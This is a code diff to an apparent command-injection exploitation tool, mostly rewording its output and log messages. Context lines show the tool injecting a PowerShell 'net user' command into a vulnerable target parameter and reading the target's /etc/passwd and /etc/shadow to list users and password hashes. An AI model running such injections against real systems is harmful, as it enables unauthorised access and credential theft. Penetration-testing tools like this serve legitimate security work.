@@ -1719,6 +1719,7 @@ def print_current_user_privs(shell, filename, _):
   # Add infos to logs file.    
   output_file = open(filename, "a")
   if not menu.options.no_logging:
+    info_msg = info_msg + "\n"
     output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
   output_file.close()
 
@@ -1729,7 +1730,7 @@ def print_os_info(target_os, target_arch, filename, _):
   if target_os and target_arch:
     if settings.VERBOSITY_LEVEL == 0 and _:
       print(settings.SINGLE_WHITESPACE)
-    info_msg = "Operating system: " +  str(target_os) + " (" + str(target_arch) + ")"
+    info_msg = "Operating system: " +  str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)
     print(settings.print_bold_info_msg(info_msg))
     # Add infos to logs file.   
     output_file = open(filename, "a")
@@ -1770,12 +1771,12 @@ class print_enumenation():
       info_msg = "Executing the 'net users' command " 
     else:
       info_msg = "Fetching content of the file '" + settings.PASSWD_FILE + "' "
-    info_msg += "in order to enumerate users entries. "
+    info_msg += "in order to enumerate operating system users. "
     print(settings.print_info_msg(info_msg))
 
   def print_passes_msg(self):
     info_msg = "Fetching content of the file '" + settings.SHADOW_FILE + "' "
-    info_msg += "in order to enumerate users password hashes. "  
+    info_msg += "in order to enumerate operating system users password hashes. "  
     print(settings.print_info_msg(info_msg))
 
   def print_single_os_cmd_msg(self, cmd):
@@ -1798,9 +1799,9 @@ def print_users(sys_users, filename, _):
         sys_users_list = sys_users_list.split()
         if settings.VERBOSITY_LEVEL == 0 and _:
           print(settings.SINGLE_WHITESPACE)
-        info_msg =  "Identified " + str(len(sys_users_list))
-        info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-        info_msg += " via 'net users' command."
+        info_msg = "Identified operating system"
+        info_msg += " user" + ('s', '')[len(sys_users_list) == 1] 
+        info_msg += " [" + str(len(sys_users_list)) + "]:"
         print(settings.print_bold_info_msg(info_msg))
         # Add infos to logs file.   
         output_file = open(filename, "a")
@@ -1813,7 +1814,7 @@ def print_users(sys_users, filename, _):
           if menu.options.privileges:
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
             if alter_shell:
-              cmd = cmd.replace("'","\\'")
+              cmd = escape_single_quoted_cmd(cmd)
             cmd = "cmd /c " + cmd 
             response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
             check_privs = cb_injector.injection_results(response, TAG, cmd)
@@ -1830,21 +1831,23 @@ def print_users(sys_users, filename, _):
           else :
             is_privileged = ""
             is_privileged_nh = ""
-          print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + ".")
+          print(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT +  sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + ".")
           # Add infos to logs file.   
           output_file = open(filename, "a")
           if not menu.options.no_logging:
-            output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + sys_users_list[user] + is_privileged + "\n" )
+            if count == 1 :
+              output_file.write("\n")
+            output_file.write("(" +str(count)+ ") " + sys_users_list[user] + is_privileged + "\n" )
           output_file.close()
       else:
         # print(settings.SINGLE_WHITESPACE)
-        warn_msg = "It seems that you don't have permissions to enumerate users entries."
+        warn_msg = "It seems that you don't have permissions to enumerate operating system users."
         print(settings.print_warning_msg(warn_msg))
     except TypeError:
       pass
     except IndexError:
       # print(settings.SINGLE_WHITESPACE)
-      warn_msg = "It seems that you don't have permissions to enumerate users entries."
+      warn_msg = "It seems that you don't have permissions to enumerate operating system users."
       print(settings.print_warning_msg(warn_msg))
       pass
       
@@ -1875,9 +1878,9 @@ def print_users(sys_users, filename, _):
           if len(sys_users_list) != 0 :
             if settings.VERBOSITY_LEVEL == 0 and _:
               print(settings.SINGLE_WHITESPACE)
-            info_msg = "Identified " + str(len(sys_users_list)) 
-            info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-            info_msg += " in '" +  settings.PASSWD_FILE + "'."
+            info_msg = "Identified operating system"
+            info_msg += " user" + ('s', '')[len(sys_users_list) == 1] 
+            info_msg += " [" + str(len(sys_users_list)) + "]:"
             print(settings.print_bold_info_msg(info_msg))
             # Add infos to logs file.   
             output_file = open(filename, "a")
@@ -1918,11 +1921,13 @@ def print_users(sys_users, filename, _):
                 else :
                   is_privileged = ""
                   is_privileged_nh = ""
-                print("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "' " + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
+                print(settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + Style.BRIGHT + fields[0] + Style.RESET_ALL + "' " + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.") 
                 # Add infos to logs file.   
                 output_file = open(filename, "a")
                 if not menu.options.no_logging:
-                  output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") '" + fields[0] + "' " + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+                  if count == 1 :
+                    output_file.write("\n")
+                  output_file.write("(" +str(count)+ ") '" + fields[0] + "' " + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
                 output_file.close()
               except ValueError:
                 if count == 1 :
@@ -1945,7 +1950,7 @@ def print_users(sys_users, filename, _):
     except IndexError:
       # print(settings.SINGLE_WHITESPACE)
       warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
-      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate operating system users." 
       print(settings.print_warning_msg(warn_msg))
       pass
 
@@ -1959,9 +1964,9 @@ def print_passes(sys_passes, filename, _):
     if len(sys_passes) != 0 :
       if settings.VERBOSITY_LEVEL == 0 and _:
         print(settings.SINGLE_WHITESPACE)
-      info_msg = "Identified " + str(len(sys_passes))
-      info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
-      info_msg += " in '" +  settings.SHADOW_FILE + "'."
+      info_msg = "Identified operating system"
+      info_msg += " user" + ('s', '')[len(sys_passes) == 1] 
+      info_msg += " password hashes [" + str(len(sys_passes)) + "]:"
       print(settings.print_bold_info_msg(info_msg))
       # Add infos to logs file.   
       output_file = open(filename, "a")
@@ -1979,7 +1984,9 @@ def print_passes(sys_passes, filename, _):
               # Add infos to logs file.   
               output_file = open(filename, "a")
               if not menu.options.no_logging:
-                output_file.write("" + settings.SUB_CONTENT_SIGN + "(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
+                if count == 1 :
+                  output_file.write("\n")
+                output_file.write("(" +str(count)+ ") " + fields[0] + " : " + fields[1] + "\n")
               output_file.close()
         # Check for appropriate '/etc/shadow' format.
         except IndexError:
